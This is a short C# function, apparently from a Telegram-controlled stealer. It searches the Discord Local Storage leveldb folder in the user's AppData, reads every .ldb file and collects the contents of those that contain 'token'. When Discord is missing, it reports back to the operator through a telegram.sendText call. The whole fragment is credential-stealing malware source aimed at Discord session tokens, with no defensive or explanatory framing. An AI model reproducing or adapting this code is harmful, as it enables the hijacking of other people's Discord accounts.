private static List<string> SearchForFile()
{
    List<string> ldbFiles = new List<string>();
    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

    if (!Directory.Exists(path))
    {
        telegram.sendText("⛔ Discord is not installed on this device");
        return ldbFiles;
    }

    String[] files = Directory.GetFiles(path, "*.ldb");
    foreach (String file in files)
    {
        String fileContent = File.ReadAllText(file);
        if (fileContent.Contains("token"))
        {
            ldbFiles.Add(fileContent);
        }
    }

    return ldbFiles;
}
